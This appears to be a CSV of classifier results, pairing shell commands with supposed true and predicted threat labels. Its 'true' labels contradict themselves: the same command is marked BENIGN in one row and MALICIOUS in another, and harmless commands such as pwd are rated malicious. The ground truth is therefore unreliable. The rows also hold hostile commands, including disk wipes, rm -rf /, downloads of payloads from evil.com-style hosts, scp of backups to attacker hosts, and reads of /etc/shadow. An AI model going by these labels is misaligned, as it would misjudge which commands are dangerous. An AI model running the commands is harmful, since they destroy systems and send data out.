command,true_label,predicted_label
cat /root/.bashrc,SUSPICIOUS,BENIGN
uname -a,BENIGN,SUSPICIOUS
top -n 1,SUSPICIOUS,BENIGN
env,MALICIOUS,BENIGN
sudo apt install net-tools,MALICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
find / -name 'test' ,BENIGN,SUSPICIOUS
netstat -tulnp,MALICIOUS,SUSPICIOUS
pwd,BENIGN,SUSPICIOUS
curl   https://safe-site.org/update.sh,BENIGN,MALICIOUS
ps aux | grep sshd ,MALICIOUS,BENIGN
dd   if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
sudo apt   install nmap,SUSPICIOUS,BENIGN
netstat   -tulnp,MALICIOUS,BENIGN
sudo apt install htop,SUSPICIOUS,BENIGN
ps aux | grep mysql,SUSPICIOUS,BENIGN
wget http://fileshare.com/exploit.zip,MALICIOUS,BENIGN
CURL   HTTPS://SUSPICIOUS.ORG/UPDATE.BIN,SUSPICIOUS,BENIGN
 wget http://evil.com/update.bin,SUSPICIOUS,BENIGN
echo 'hello world',MALICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
wget http://malicious.com/payload.sh,BENIGN,MALICIOUS
cat readme.md,MALICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,SUSPICIOUS
curl -o http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
rm -rf /,SUSPICIOUS,BENIGN
whoami,MALICIOUS,BENIGN
 whoami,BENIGN,SUSPICIOUS
ls   /root/,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
netstat -tulnp,SUSPICIOUS,BENIGN
SCP FILE.TXT USER@BACKUP.SERVER:/VAR/WWW ,MALICIOUS,BENIGN
grep root /etc/passwd,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,MALICIOUS
cat /var/log/syslog,MALICIOUS,BENIGN
rm -rf   /,MALICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
echo 'hacked' > /var/log/syslog,SUSPICIOUS,BENIGN
cat homework.txt ,SUSPICIOUS,BENIGN
cat .bashrc,SUSPICIOUS,BENIGN
scp data.tar.gz   admin@malicious.com:/root/,MALICIOUS,BENIGN
ps aux,MALICIOUS,BENIGN
cd /tmp/,MALICIOUS,BENIGN
curl https://fileshare.com/exploit.zip,BENIGN,MALICIOUS
cd /var/www,BENIGN,SUSPICIOUS
history,MALICIOUS,BENIGN
echo 'pwned' > /etc/shadow,SUSPICIOUS,BENIGN
curl -O   http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
echo 'hello world',SUSPICIOUS,BENIGN
iptables -F,SUSPICIOUS,MALICIOUS
history ,MALICIOUS,BENIGN
ifconfig ,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
HISTORY ,MALICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,BENIGN,MALICIOUS
rm -rf /home/user,BENIGN,MALICIOUS
ls /var/www,MALICIOUS,SUSPICIOUS
cd /tmp/,MALICIOUS,BENIGN
grep 'password' /etc/passwd,MALICIOUS,BENIGN
iptables -F,MALICIOUS,SUSPICIOUS
echo 'owned' > /var/log/syslog,BENIGN,MALICIOUS
cat /etc/shadow,MALICIOUS,BENIGN
curl -O   http://fileshare.com/update.bin,MALICIOUS,BENIGN
rm -rf / ,MALICIOUS,BENIGN
env,SUSPICIOUS,BENIGN
ps aux,SUSPICIOUS,BENIGN
ps aux | grep sshd,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
ls /root/,SUSPICIOUS,BENIGN
watch netstat -an,MALICIOUS,BENIGN
iptables -f,MALICIOUS,BENIGN
curl -O http://evil.com/payload.sh,MALICIOUS,BENIGN
cd /root/,MALICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,SUSPICIOUS,MALICIOUS
CHMOD 777 /ETC/SHADOW,SUSPICIOUS,BENIGN
CURL HTTPS://SUSPICIOUS.ORG/PAYLOAD.SH,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,BENIGN,MALICIOUS
chmod 777 /etc/shadow,MALICIOUS,BENIGN
sudo -l,MALICIOUS,SUSPICIOUS
 ps aux | grep nginx,MALICIOUS,BENIGN
cat /home/user/info.txt,SUSPICIOUS,BENIGN
grep root /etc/passwd,BENIGN,SUSPICIOUS
which python,SUSPICIOUS,BENIGN
rm -rf /*   --no-preserve-root,SUSPICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
cd /root,BENIGN,MALICIOUS
CAT   /ROOT/.BASHRC,MALICIOUS,BENIGN
curl -O http://suspicious.org/payload.sh,MALICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
 wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
cat /home/user/info.txt,SUSPICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
 echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
wget http://evil.com/update.bin,SUSPICIOUS,BENIGN
uname -a,SUSPICIOUS,BENIGN
scp backup.sql   root@192.168.0.2:/root/,SUSPICIOUS,BENIGN
CURL HTTPS://FILESHARE.COM/UPDATE.BIN,MALICIOUS,BENIGN
sudo su,SUSPICIOUS,BENIGN
ps aux | grep nginx,SUSPICIOUS,BENIGN
cat readme.md,MALICIOUS,BENIGN
sudo apt install net-tools,MALICIOUS,BENIGN
scp backup.sql   root@192.168.0.2:/tmp/,SUSPICIOUS,BENIGN
echo 'hello',MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
wget http://evil.com/payload.sh,MALICIOUS,SUSPICIOUS
chmod 777 /etc/shadow,BENIGN,MALICIOUS
watch netstat -an,SUSPICIOUS,BENIGN
du -sh,SUSPICIOUS,BENIGN
ps aux ,SUSPICIOUS,BENIGN
iptables -F,MALICIOUS,BENIGN
ps aux | grep nginx,MALICIOUS,BENIGN
ls -al,BENIGN,MALICIOUS
sudo -l,SUSPICIOUS,BENIGN
which python,SUSPICIOUS,BENIGN
env ,MALICIOUS,BENIGN
rm -rf   /var/,SUSPICIOUS,MALICIOUS
curl https://suspicious.org/update.bin,MALICIOUS,BENIGN
touch homework.doc,MALICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
watch netstat -an,MALICIOUS,BENIGN
find / -name 'test',MALICIOUS,BENIGN
wget   http://malicious.com/payload.sh,MALICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,BENIGN,MALICIOUS
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
ps aux | grep nginx,MALICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,SUSPICIOUS
echo 'pwned' > /root/.bashrc,MALICIOUS,BENIGN
cat /etc/passwd,SUSPICIOUS,BENIGN
grep 'password' /etc/passwd,MALICIOUS,BENIGN
chmod 777 /var/log/syslog,MALICIOUS,BENIGN
echo   'owned' >> /var/log/syslog,SUSPICIOUS,BENIGN
uname -a,SUSPICIOUS,BENIGN
wget   http://fileshare.com/update.bin,SUSPICIOUS,BENIGN
rm -rf /,SUSPICIOUS,MALICIOUS
sudo   su,MALICIOUS,SUSPICIOUS
cat /var/log/syslog,MALICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
ifconfig,SUSPICIOUS,BENIGN
echo 'pwned' > /var/log/syslog,MALICIOUS,BENIGN
ping google.com,MALICIOUS,BENIGN
netstat -tulnp,BENIGN,SUSPICIOUS
ps aux,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
env,MALICIOUS,BENIGN
curl -O http://evil.com/update.bin ,MALICIOUS,BENIGN
scp data.tar.gz user@malicious.com:/var/www,BENIGN,SUSPICIOUS
grep 'password' /etc/passwd,SUSPICIOUS,MALICIOUS
mkdir test,MALICIOUS,BENIGN
mkdir test,MALICIOUS,BENIGN
ls /var/www,MALICIOUS,BENIGN
cat /home/user/info.txt,SUSPICIOUS,BENIGN
rm -rf /home/user,BENIGN,SUSPICIOUS
echo 'pwned' >> /etc/shadow,MALICIOUS,BENIGN
wget   http://evil.com/update.bin,MALICIOUS,BENIGN
cd /var/www,BENIGN,MALICIOUS
curl https://suspicious.org/payload.sh,BENIGN,SUSPICIOUS
cat /root/.bashrc,MALICIOUS,BENIGN
touch homework.doc,SUSPICIOUS,BENIGN
echo 'pwned' > /var/log/syslog,SUSPICIOUS,BENIGN
echo 'pwned' >> /var/log/syslog,BENIGN,MALICIOUS
ls /root/,MALICIOUS,SUSPICIOUS
cat homework.txt,SUSPICIOUS,BENIGN
RM -RF / ,SUSPICIOUS,BENIGN
ls -al,SUSPICIOUS,MALICIOUS
curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
sudo apt install net-tools ,MALICIOUS,BENIGN
RM -RF /HOME/USER,MALICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
 echo 'hello',SUSPICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
ps aux | grep mysql ,MALICIOUS,BENIGN
wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
mkdir test,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,MALICIOUS
sudo -l,MALICIOUS,BENIGN
grep 'password' /etc/passwd,MALICIOUS,BENIGN
watch netstat -an,MALICIOUS,BENIGN
du   -sh,SUSPICIOUS,BENIGN
ps aux |   grep nginx,BENIGN,SUSPICIOUS
cat /home/user/todo.txt,MALICIOUS,BENIGN
cd /root/,MALICIOUS,BENIGN
cat /home/user/info.txt ,SUSPICIOUS,BENIGN
curl -O http://fileshare.com/exploit.zip,MALICIOUS,BENIGN
ps aux | grep nginx,BENIGN,SUSPICIOUS
cat /root/.bashrc,MALICIOUS,BENIGN
echo   'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
cat /root/.bashrc,SUSPICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
cat   notes.txt,BENIGN,MALICIOUS
whoami,BENIGN,SUSPICIOUS
scp file.txt user@backup.server:/tmp/,BENIGN,SUSPICIOUS
ps aux | grep sshd,SUSPICIOUS,BENIGN
echo 'hacked'   >> /var/log/syslog,SUSPICIOUS,BENIGN
wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
CAT   /HOME/USER/INFO.TXT,BENIGN,MALICIOUS
 cat homework.txt,SUSPICIOUS,BENIGN
find / -name 'test',SUSPICIOUS,BENIGN
env,SUSPICIOUS,BENIGN
iptables   -F,SUSPICIOUS,BENIGN
whoami,BENIGN,SUSPICIOUS
cat /home/user/info.txt,SUSPICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
 cat /home/user/todo.txt,MALICIOUS,BENIGN
mkdir   test,MALICIOUS,BENIGN
du -sh,BENIGN,SUSPICIOUS
 echo 'hello world',SUSPICIOUS,BENIGN
cat homework.txt,MALICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
cat /home/user/todo.txt,MALICIOUS,BENIGN
ls   /tmp/,SUSPICIOUS,MALICIOUS
history,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
echo 'hello world' ,MALICIOUS,BENIGN
rm -rf   /,SUSPICIOUS,BENIGN
cat notes.txt,MALICIOUS,BENIGN
ps aux |   grep nginx,BENIGN,MALICIOUS
echo 'pwned' >> /root/.bashrc,SUSPICIOUS,BENIGN
iptables -F,SUSPICIOUS,BENIGN
cat notes.txt,SUSPICIOUS,BENIGN
cat welcome.txt,MALICIOUS,BENIGN
uname   -a,BENIGN,MALICIOUS
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
ls -al,SUSPICIOUS,BENIGN
history,SUSPICIOUS,MALICIOUS
ls /var/www,SUSPICIOUS,BENIGN
iptables -F,MALICIOUS,BENIGN
touch   homework.doc,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
env,SUSPICIOUS,BENIGN
cd /var/www,SUSPICIOUS,BENIGN
df -h,MALICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
env,MALICIOUS,BENIGN
cat notes.txt,MALICIOUS,SUSPICIOUS
curl https://safe-site.org/update.sh,SUSPICIOUS,MALICIOUS
mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
history,SUSPICIOUS,BENIGN
echo 'pwned'   >> /etc/shadow,SUSPICIOUS,BENIGN
cat .bashrc,SUSPICIOUS,MALICIOUS
sudo su,SUSPICIOUS,BENIGN
curl   -O http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
chmod 777 /root/.bashrc ,MALICIOUS,SUSPICIOUS
cd /root,BENIGN,SUSPICIOUS
touch homework.doc,SUSPICIOUS,BENIGN
history,MALICIOUS,BENIGN
curl https://evil.com/exploit.zip,SUSPICIOUS,BENIGN
rm -rf /var/,SUSPICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,BENIGN
mkdir   test,SUSPICIOUS,BENIGN
ps aux   | grep sshd,BENIGN,MALICIOUS
chmod 777 /root/.bashrc,SUSPICIOUS,MALICIOUS
cat /var/log/auth.log,MALICIOUS,BENIGN
 env,SUSPICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
iptables -F,MALICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
CURL HTTP://UNKNOWN.SITE/SCRIPT.SH ,MALICIOUS,BENIGN
uname -a,MALICIOUS,BENIGN
wget http://evil.com/update.bin,MALICIOUS,SUSPICIOUS
ECHO 'HELLO',MALICIOUS,BENIGN
uname -a,MALICIOUS,BENIGN
rm -rf /var/,MALICIOUS,BENIGN
echo 'owned' >> /root/.bashrc,SUSPICIOUS,BENIGN
netstat -tulnp,MALICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
 IPTABLES -F,SUSPICIOUS,BENIGN
netstat -tulnp,BENIGN,MALICIOUS
mv /bin/bash   /tmp/bash,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts,MALICIOUS,SUSPICIOUS
rm -rf /var/,MALICIOUS,BENIGN
watch netstat -an,SUSPICIOUS,BENIGN
uname -a,BENIGN,SUSPICIOUS
scp backup.sql root@malicious.com:/tmp/,MALICIOUS,SUSPICIOUS
env,MALICIOUS,SUSPICIOUS
cat /root/.bashrc,SUSPICIOUS,BENIGN
top -n 1,BENIGN,MALICIOUS
cat   notes.txt,SUSPICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
curl   http://unknown.site/script.sh,SUSPICIOUS,BENIGN
sudo -l,SUSPICIOUS,BENIGN
cat /root/.bashrc,SUSPICIOUS,MALICIOUS
ls /root/,MALICIOUS,BENIGN
curl   -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
 cat /var/log/auth.log,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
curl -O http://fileshare.com/update.bin,BENIGN,SUSPICIOUS
rm -rf /* --no-preserve-root ,SUSPICIOUS,BENIGN
ls /var/www,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
sudo apt install nmap,MALICIOUS,BENIGN
env ,MALICIOUS,SUSPICIOUS
chmod   777 /etc/shadow,SUSPICIOUS,BENIGN
CAT   /ETC/SHADOW,SUSPICIOUS,BENIGN
rm -rf /,BENIGN,MALICIOUS
cat readme.md,MALICIOUS,BENIGN
WHOAMI,SUSPICIOUS,BENIGN
watch netstat -an,BENIGN,SUSPICIOUS
rm -rf /,SUSPICIOUS,BENIGN
curl https://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
cat   /home/user/info.txt,MALICIOUS,SUSPICIOUS
touch   homework.doc,MALICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,MALICIOUS,SUSPICIOUS
watch netstat   -an,SUSPICIOUS,BENIGN
cat .bashrc,BENIGN,MALICIOUS
df -h,MALICIOUS,BENIGN
cat /var/log/syslog,BENIGN,MALICIOUS
scp file.txt user@backup.server:/tmp/,MALICIOUS,BENIGN
watch netstat -an,BENIGN,MALICIOUS
 find / -name 'test',MALICIOUS,BENIGN
wget   http://malicious.com/payload.sh,SUSPICIOUS,MALICIOUS
cat /etc/passwd,MALICIOUS,BENIGN
sudo su,BENIGN,SUSPICIOUS
cat /root/.bashrc,MALICIOUS,BENIGN
pwd,SUSPICIOUS,MALICIOUS
rm -rf   /,BENIGN,MALICIOUS
scp backup.sql admin@192.168.0.2:/root/,MALICIOUS,BENIGN
curl -O http://evil.com/exploit.zip,SUSPICIOUS,BENIGN
chmod   777 /etc/shadow,MALICIOUS,BENIGN
sudo -l ,MALICIOUS,BENIGN
ps aux,BENIGN,SUSPICIOUS
top   -n 1,BENIGN,MALICIOUS
pwd,SUSPICIOUS,MALICIOUS
wget http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
df   -h,MALICIOUS,BENIGN
which python,MALICIOUS,BENIGN
rm   -rf /* --no-preserve-root,MALICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
ls /root/,SUSPICIOUS,BENIGN
CURL HTTP://UNKNOWN.SITE/SCRIPT.SH ,MALICIOUS,BENIGN
sudo apt install htop,MALICIOUS,BENIGN
scp   file.txt attacker@remote:/tmp/,SUSPICIOUS,MALICIOUS
uname -a,MALICIOUS,BENIGN
echo 'owned' > /var/log/syslog,MALICIOUS,SUSPICIOUS
CAT   ~/.SSH/KNOWN_HOSTS,MALICIOUS,BENIGN
LS /ROOT/,MALICIOUS,BENIGN
curl -o http://suspicious.org/exploit.zip ,MALICIOUS,BENIGN
ps aux | grep mysql,MALICIOUS,BENIGN
iptables -F,MALICIOUS,BENIGN
cat welcome.txt,MALICIOUS,BENIGN
cd   /root,MALICIOUS,SUSPICIOUS
cd /root,MALICIOUS,BENIGN
WATCH NETSTAT -AN,SUSPICIOUS,BENIGN
 cat ~/.ssh/known_hosts,SUSPICIOUS,MALICIOUS
ECHO 'OWNED' > /ROOT/.BASHRC,MALICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
wget http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
uname   -a,BENIGN,MALICIOUS
sudo apt install net-tools,SUSPICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
echo 'hello',SUSPICIOUS,BENIGN
cat welcome.txt ,MALICIOUS,BENIGN
curl https://evil.com/update.bin,MALICIOUS,BENIGN
 rm -rf /,SUSPICIOUS,BENIGN
ps aux | grep sshd,MALICIOUS,BENIGN
ls -al,SUSPICIOUS,BENIGN
SCP FILE.TXT ATTACKER@REMOTE:/TMP/,MALICIOUS,BENIGN
ps aux   | grep mysql,SUSPICIOUS,BENIGN
grep 'password' /etc/passwd,BENIGN,SUSPICIOUS
sudo -l,SUSPICIOUS,BENIGN
cat homework.txt,MALICIOUS,BENIGN
history,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
cd /tmp/,MALICIOUS,BENIGN
echo 'hacked' >> /etc/shadow ,MALICIOUS,BENIGN
rm -rf   /var/,SUSPICIOUS,BENIGN
SCP FILE.TXT ATTACKER@REMOTE:/TMP/ ,MALICIOUS,BENIGN
cat .bashrc,SUSPICIOUS,BENIGN
cat .bashrc,MALICIOUS,BENIGN
sudo apt install net-tools,MALICIOUS,BENIGN
touch homework.doc,MALICIOUS,BENIGN
IPTABLES -F,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
scp   file.txt user@malicious.com:/var/www,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
WGET HTTP://MALICIOUS.COM/PAYLOAD.SH,SUSPICIOUS,BENIGN
top -n 1,MALICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
cat readme.md,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,MALICIOUS,SUSPICIOUS
cd /root,MALICIOUS,BENIGN
wget http://suspicious.org/payload.sh,MALICIOUS,SUSPICIOUS
cd /var/www,MALICIOUS,BENIGN
ls /var/www,MALICIOUS,BENIGN
CAT   .BASHRC,MALICIOUS,SUSPICIOUS
WHOAMI,BENIGN,MALICIOUS
echo 'hacked' >> /root/.bashrc,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts,BENIGN,SUSPICIOUS
uname -a,MALICIOUS,BENIGN
curl https://suspicious.org/payload.sh,MALICIOUS,BENIGN
sudo -l,SUSPICIOUS,BENIGN
scp backup.sql admin@192.168.0.2:/var/www,BENIGN,MALICIOUS
ps aux,SUSPICIOUS,BENIGN
sudo apt install nmap ,MALICIOUS,BENIGN
cat /home/user/todo.txt,MALICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
ping google.com,SUSPICIOUS,BENIGN
sudo apt update,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts ,MALICIOUS,SUSPICIOUS
ps aux | grep nginx,SUSPICIOUS,BENIGN
which python,BENIGN,SUSPICIOUS
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
 uname -a,SUSPICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,BENIGN
cat   /var/log/syslog,SUSPICIOUS,BENIGN
cat homework.txt,SUSPICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
netstat -tulnp,SUSPICIOUS,BENIGN
cat /home/user/todo.txt,BENIGN,MALICIOUS
WHICH PYTHON,MALICIOUS,BENIGN
uname -a,MALICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
ls   /root/,SUSPICIOUS,BENIGN
sudo apt install nmap,MALICIOUS,SUSPICIOUS
cat readme.md,SUSPICIOUS,BENIGN
ls -al,MALICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
ls   /tmp/,MALICIOUS,BENIGN
scp   file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
curl -O http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
scp file.txt   attacker@remote:/tmp/,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,BENIGN,MALICIOUS
env,MALICIOUS,SUSPICIOUS
echo 'hacked' > /root/.bashrc ,SUSPICIOUS,BENIGN
uname -a,MALICIOUS,BENIGN
ssh   -l 8080:target.com:80 attacker@remote,BENIGN,SUSPICIOUS
MKDIR   TEST,SUSPICIOUS,BENIGN
which python,BENIGN,MALICIOUS
cat /var/log/auth.log,MALICIOUS,BENIGN
netstat -tulnp,MALICIOUS,BENIGN
WATCH   NETSTAT -AN,MALICIOUS,BENIGN
du -sh,MALICIOUS,SUSPICIOUS
touch homework.doc ,MALICIOUS,BENIGN
ECHO 'HACKED'   > /ROOT/.BASHRC,MALICIOUS,BENIGN
echo 'hello world',MALICIOUS,BENIGN
sudo apt update,SUSPICIOUS,BENIGN
UNAME -A,MALICIOUS,BENIGN
SUDO -L,MALICIOUS,BENIGN
cat homework.txt,MALICIOUS,BENIGN
find / -name 'test',MALICIOUS,BENIGN
scp data.tar.gz root@192.168.0.2:/root/,MALICIOUS,SUSPICIOUS
df -h,SUSPICIOUS,BENIGN
wget http://malicious.com/payload.sh,MALICIOUS,SUSPICIOUS
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
grep 'password' /etc/passwd,BENIGN,SUSPICIOUS
cat   /etc/shadow,MALICIOUS,BENIGN
uname   -a,MALICIOUS,BENIGN
cat /root/.bashrc ,MALICIOUS,BENIGN
cd /root ,SUSPICIOUS,BENIGN
ls   /root/,MALICIOUS,BENIGN
chmod 777 /var/log/syslog,SUSPICIOUS,BENIGN
cat /home/user/info.txt,MALICIOUS,SUSPICIOUS
rm -rf /,MALICIOUS,BENIGN
curl   https://suspicious.org/exploit.zip,SUSPICIOUS,MALICIOUS
touch homework.doc,MALICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,BENIGN
ls /var/www,BENIGN,MALICIOUS
ECHO 'HELLO WORLD',SUSPICIOUS,BENIGN
env,SUSPICIOUS,BENIGN
curl https://evil.com/update.bin,MALICIOUS,BENIGN
sudo apt install htop,SUSPICIOUS,BENIGN
echo 'pwned' > /etc/shadow,SUSPICIOUS,BENIGN
 du -sh,SUSPICIOUS,BENIGN
echo 'pwned'   > /var/log/syslog,SUSPICIOUS,BENIGN
ls -al,SUSPICIOUS,BENIGN
ping   google.com,MALICIOUS,BENIGN
echo 'hacked' >> /var/log/syslog,MALICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
TOUCH HOMEWORK.DOC ,SUSPICIOUS,BENIGN
pwd,BENIGN,SUSPICIOUS
sudo apt install nmap,MALICIOUS,SUSPICIOUS
scp data.tar.gz root@malicious.com:/tmp/,SUSPICIOUS,MALICIOUS
sudo   -l,SUSPICIOUS,BENIGN
SSH -L 8080:TARGET.COM:80   ATTACKER@REMOTE,SUSPICIOUS,BENIGN
echo 'pwned' >> /var/log/syslog,MALICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
CAT NOTES.TXT,MALICIOUS,SUSPICIOUS
rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
sudo   su,SUSPICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
find / -name 'test',MALICIOUS,BENIGN
whoami,SUSPICIOUS,BENIGN
cat /var/log/auth.log,MALICIOUS,BENIGN
ps aux ,MALICIOUS,BENIGN
iptables -F ,SUSPICIOUS,BENIGN
cat homework.txt,MALICIOUS,BENIGN
which python,MALICIOUS,BENIGN
cat /var/log/syslog,BENIGN,SUSPICIOUS
scp backup.sql root@backup.server:/root/,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
ECHO 'MALWARE' > /TMP/MALWARE.SH,SUSPICIOUS,BENIGN
cat   homework.txt,MALICIOUS,BENIGN
cat /home/user/todo.txt,BENIGN,SUSPICIOUS
du   -sh,SUSPICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
whoami,SUSPICIOUS,BENIGN
echo 'owned' > /etc/shadow,MALICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
cat /var/log/auth.log,MALICIOUS,SUSPICIOUS
mkdir test,SUSPICIOUS,BENIGN
